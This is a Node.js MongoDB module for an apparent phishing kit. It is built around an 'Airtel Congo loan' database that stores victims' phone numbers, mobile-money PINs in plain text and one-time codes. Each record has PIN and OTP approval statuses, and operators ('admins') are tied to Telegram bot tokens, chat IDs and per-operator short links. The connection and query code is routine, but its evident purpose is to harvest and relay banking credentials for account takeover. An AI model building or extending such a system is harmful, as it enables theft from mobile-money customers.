const { MongoClient } = require('mongodb');

let client;
let db;
let isConnected = false;
let reconnectTimer = null;

const DB_NAME = 'airtel_congo_loan';
const COLLECTIONS = {
    ADMINS:       'admins',
    APPLICATIONS: 'applications',
    SHORT_LINKS:  'short_links'
};

// ==========================================
// CONNECTION OPTIONS — keeps connection alive forever
// ==========================================
const CLIENT_OPTIONS = {
    // Connection pool — keep connections open and ready
    maxPoolSize:        10,
    minPoolSize:        2,      // always keep 2 connections warm
    maxIdleTimeMS:      0,      // NEVER close idle connections

    // Timeouts
    serverSelectionTimeoutMS: 10000,   // 10s to find a server
    connectTimeoutMS:         10000,   // 10s to establish connection
    socketTimeoutMS:          0,       // NEVER timeout on socket (0 = infinite)

    // Keep-alive at TCP level — prevents firewall/proxy from killing idle connections
    keepAlive:             true,
    keepAliveInitialDelay: 30000,      // send first keepAlive after 30s idle

    // Heartbeat — driver pings server to detect drops early
    heartbeatFrequencyMS: 10000,       // ping every 10s

    // Retry writes automatically on transient errors
    retryWrites: true,
    retryReads:  true,
};

// ==========================================
// CONNECT — with auto-reconnect on drop
// ==========================================
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;
        if (!MONGODB_URI) throw new Error('MONGODB_URI is not set in environment variables');

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI, CLIENT_OPTIONS);

        // Auto-reconnect on unexpected close
        client.on('close', () => {
            isConnected = false;
            console.error('⚠️  MongoDB connection closed unexpectedly — scheduling reconnect...');
            scheduleReconnect();
        });

        client.on('error', (err) => {
            console.error('⚠️  MongoDB client error:', err.message);
        });

        client.on('timeout', () => {
            console.error('⚠️  MongoDB connection timed out');
        });

        await client.connect();
        db = client.db(DB_NAME);
        isConnected = true;

        // Verify with a ping
        await db.command({ ping: 1 });
        console.log('✅ MongoDB connected and ping OK');

        await createIndexes();

        // Background health check
        startHealthCheck();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        isConnected = false;
        scheduleReconnect();
        throw error;
    }
}

// ==========================================
// RECONNECT — retry with exponential backoff
// ==========================================
function scheduleReconnect(delayMs = 5000) {
    if (reconnectTimer) return; // already scheduled

    console.log(`🔄 Reconnecting to MongoDB in ${delayMs / 1000}s...`);
    reconnectTimer = setTimeout(async () => {
        reconnectTimer = null;
        try {
            if (client) {
                try { await client.close(true); } catch (_) {}
            }

            const MONGODB_URI = process.env.MONGODB_URI;
            client = new MongoClient(MONGODB_URI, CLIENT_OPTIONS);

            client.on('close', () => {
                isConnected = false;
                console.error('⚠️  MongoDB closed — scheduling reconnect...');
                scheduleReconnect();
            });
            client.on('error', (err) => console.error('⚠️  MongoDB error:', err.message));

            await client.connect();
            db = client.db(DB_NAME);
            isConnected = true;
            await db.command({ ping: 1 });
            console.log('✅ MongoDB reconnected successfully');
            startHealthCheck();
        } catch (err) {
            console.error('❌ Reconnect failed:', err.message);
            isConnected = false;
            scheduleReconnect(Math.min(delayMs * 2, 60000)); // backoff up to 60s
        }
    }, delayMs);
}

// ==========================================
// HEALTH CHECK — ping every 30s
// ==========================================
let healthCheckInterval = null;
function startHealthCheck() {
    if (healthCheckInterval) clearInterval(healthCheckInterval);

    healthCheckInterval = setInterval(async () => {
        try {
            if (!db) { isConnected = false; scheduleReconnect(); return; }
            await db.command({ ping: 1 });
            if (!isConnected) {
                isConnected = true;
                console.log('✅ MongoDB health check: connection restored');
            }
        } catch (err) {
            isConnected = false;
            console.error('⚠️  MongoDB health check failed:', err.message);
            scheduleReconnect();
        }
    }, 30000);

    // Don't prevent graceful shutdown
    if (healthCheckInterval.unref) healthCheckInterval.unref();
}

// ==========================================
// SAFE WRAPPER — retries once on connection error
// ==========================================
function getDb() {
    if (!db || !isConnected) {
        throw new Error('Database not connected. Retry in a moment.');
    }
    return db;
}

async function withRetry(fn, label = 'DB operation') {
    try {
        return await fn(getDb());
    } catch (err) {
        if (isConnectionError(err)) {
            console.warn(`⚠️  ${label} failed (connection issue), retrying in 1s...`);
            await sleep(1000);
            try {
                return await fn(getDb());
            } catch (retryErr) {
                console.error(`❌ ${label} retry failed:`, retryErr.message);
                throw retryErr;
            }
        }
        throw err;
    }
}

function isConnectionError(err) {
    const msg = err?.message?.toLowerCase() || '';
    return (
        msg.includes('topology') ||
        msg.includes('connection') ||
        msg.includes('not connected') ||
        msg.includes('socket') ||
        msg.includes('econnreset') ||
        msg.includes('econnrefused') ||
        msg.includes('etimedout') ||
        err?.name === 'MongoNetworkError' ||
        err?.name === 'MongoServerSelectionError'
    );
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ==========================================
// CLOSE — only on intentional graceful shutdown
// ==========================================
async function closeDatabase() {
    if (healthCheckInterval) { clearInterval(healthCheckInterval); healthCheckInterval = null; }
    if (reconnectTimer)      { clearTimeout(reconnectTimer);       reconnectTimer = null; }
    if (client) {
        try {
            isConnected = false;
            await client.close();
            console.log('✅ MongoDB connection closed gracefully');
        } catch (err) {
            console.error('⚠️  Error closing MongoDB:', err.message);
        }
    }
}

// ==========================================
// INDEXES
// ==========================================
async function createIndexes() {
    try {
        const d = getDb();
        await d.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await d.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await d.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await d.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });

        await d.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await d.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await d.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await d.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await d.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await d.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        await d.collection(COLLECTIONS.SHORT_LINKS).createIndex({ code: 1 },    { unique: true });
        await d.collection(COLLECTIONS.SHORT_LINKS).createIndex({ adminId: 1 }, { unique: true });

        console.log('✅ Database indexes created');
    } catch (error) {
        // Non-fatal — indexes usually already exist after first run
        console.warn('⚠️  Index creation warning:', error.message);
    }
}

// ==========================================
// SHORT LINK OPERATIONS
// ==========================================
function generateShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let code = '';
    for (let i = 0; i < 6; i++) code += chars[Math.floor(Math.random() * chars.length)];
    return code;
}

async function getOrCreateShortLink(adminId) {
    return withRetry(async (d) => {
        const existing = await d.collection(COLLECTIONS.SHORT_LINKS).findOne({ adminId });
        if (existing) return existing.code;

        let code, attempts = 0;
        while (attempts < 10) {
            code = generateShortCode();
            const conflict = await d.collection(COLLECTIONS.SHORT_LINKS).findOne({ code });
            if (!conflict) break;
            attempts++;
        }
        if (!code) throw new Error('Failed to generate unique short code');

        await d.collection(COLLECTIONS.SHORT_LINKS).insertOne({
            code, adminId, createdAt: new Date().toISOString()
        });
        console.log(`🔗 Short link created: /s/${code} → ${adminId}`);
        return code;
    }, 'getOrCreateShortLink');
}

async function resolveShortLink(code) {
    return withRetry(async (d) => {
        const doc = await d.collection(COLLECTIONS.SHORT_LINKS).findOne({ code: code.toLowerCase() });
        return doc ? doc.adminId : null;
    }, 'resolveShortLink');
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================
async function saveAdmin(adminData) {
    return withRetry(async (d) => {
        const adminId = adminData.adminId || adminData.id;
        if (!adminId)          throw new Error('Admin ID is required');
        if (!adminData.name)   throw new Error('Admin name is required');
        if (!adminData.email)  throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const existing = await d.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existing) throw new Error(`Admin ${adminId} already exists`);

        const doc = {
            adminId,
            name:      adminData.name,
            email:     adminData.email,
            chatId:    adminData.chatId,
            status:    adminData.status    || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };
        if (adminData.botToken) doc.botToken = adminData.botToken;

        const result = await d.collection(COLLECTIONS.ADMINS).insertOne(doc);
        console.log(`✅ Admin saved: ${adminId} (${adminData.name})`);
        return result;
    }, 'saveAdmin');
}

async function getAdmin(adminId) {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    }, 'getAdmin').catch(err => { console.error('❌ getAdmin error:', err.message); return null; });
}

async function getAdminByChatId(chatId) {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    }, 'getAdminByChatId').catch(err => { console.error('❌ getAdminByChatId error:', err.message); return null; });
}

async function getAllAdmins() {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
    }, 'getAllAdmins').catch(err => { console.error('❌ getAllAdmins error:', err.message); return []; });
}

async function getActiveAdmins() {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.ADMINS).find({ status: 'active' }).toArray();
    }, 'getActiveAdmins').catch(err => { console.error('❌ getActiveAdmins error:', err.message); return []; });
}

async function updateAdmin(adminId, updates) {
    return withRetry(async (d) => {
        const result = await d.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    }, 'updateAdmin');
}

async function updateAdminStatus(adminId, status) {
    return withRetry(async (d) => {
        const result = await d.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} status → ${status}`);
        return result;
    }, 'updateAdminStatus');
}

async function deleteAdmin(adminId) {
    return withRetry(async (d) => {
        const result = await d.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    }, 'deleteAdmin');
}

async function adminExists(adminId) {
    return withRetry(async (d) => {
        const count = await d.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    }, 'adminExists').catch(() => false);
}

async function getAdminCount() {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.ADMINS).countDocuments({});
    }, 'getAdminCount').catch(() => 0);
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================
async function saveApplication(appData) {
    return withRetry(async (d) => {
        const result = await d.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id:             appData.id,
            adminId:        appData.adminId,
            adminName:      appData.adminName,
            phoneNumber:    appData.phoneNumber,
            pin:            appData.pin,
            pinStatus:      appData.pinStatus  || 'pending',
            otpStatus:      appData.otpStatus  || 'pending',
            otp:            appData.otp        || null,
            assignmentType: appData.assignmentType,
            timestamp:      appData.timestamp  || new Date().toISOString()
        });
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    }, 'saveApplication');
}

async function getApplication(applicationId) {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    }, 'getApplication').catch(err => { console.error('❌ getApplication error:', err.message); return null; });
}

async function updateApplication(applicationId, updates) {
    return withRetry(async (d) => {
        const result = await d.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    }, 'updateApplication');
}

async function getApplicationsByAdmin(adminId) {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.APPLICATIONS).find({ adminId }).sort({ timestamp: -1 }).toArray();
    }, 'getApplicationsByAdmin').catch(() => []);
}

async function getPendingApplications(adminId) {
    return withRetry(async (d) => {
        return await d.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId, $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }] })
            .sort({ timestamp: -1 }).toArray();
    }, 'getPendingApplications').catch(() => []);
}

// ==========================================
// STATISTICS
// ==========================================
async function getAdminStats(adminId) {
    return withRetry(async (d) => {
        const [total, pinPending, pinApproved, otpPending, fullyApproved] = await Promise.all([
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' }),
        ]);
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    }, 'getAdminStats').catch(() => ({ total:0, pinPending:0, pinApproved:0, otpPending:0, fullyApproved:0 }));
}

async function getStats() {
    return withRetry(async (d) => {
        const [totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected] = await Promise.all([
            d.collection(COLLECTIONS.ADMINS).countDocuments({}),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({}),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' }),
            d.collection(COLLECTIONS.APPLICATIONS).countDocuments({
                $or: [{ pinStatus: 'rejected' }, { otpStatus: 'wrongpin_otp' }, { otpStatus: 'wrongcode' }]
            }),
        ]);
        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    }, 'getStats').catch(() => ({
        totalAdmins:0, totalApplications:0, pinPending:0,
        pinApproved:0, otpPending:0, fullyApproved:0, totalRejected:0
    }));
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        return await Promise.all(admins.map(async (admin) => ({
            adminId: admin.adminId,
            name: admin.name,
            ...(await getAdminStats(admin.adminId))
        })));
    } catch (err) {
        console.error('❌ getPerAdminStats error:', err.message);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================
async function getAllAdminsDetailed() {
    const admins = await getAllAdmins();
    admins.forEach(a => console.log(`   ${a.adminId}: ${a.name} (chatId: ${a.chatId}, status: ${a.status})`));
    return admins;
}

async function cleanupInvalidAdmins() {
    return withRetry(async (d) => {
        const result = await d.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } }, { adminId: null }, { adminId: '' },
                { chatId:  { $exists: false } }, { chatId:  null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    }, 'cleanupInvalidAdmins');
}

// ==========================================
// EXPORTS
// ==========================================
module.exports = {
    connectDatabase,
    closeDatabase,

    // Short links
    getOrCreateShortLink,
    resolveShortLink,

    // Admin
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    // Applications
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    // Stats
    getAdminStats,
    getStats,
    getPerAdminStats,

    // Debug
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
